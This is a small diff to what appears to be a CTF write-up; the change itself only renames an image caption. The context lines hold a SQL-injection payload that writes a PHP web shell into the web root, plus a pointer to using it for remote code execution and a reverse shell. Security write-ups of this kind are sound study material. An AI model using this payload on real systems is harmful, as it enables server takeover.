@@ -126,7 +126,7 @@ payload -> select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/as
 
 Burp request with double url
 
-![DoubleURLEncode](/images/crowsec/exposed/doubleURLEncode.png)
+![Untitled](/images/crowsec/exposed/doubleURLEncode.png)
 
 Go to the /assets/<name>.php to access the RCE and create a reverse shell
 
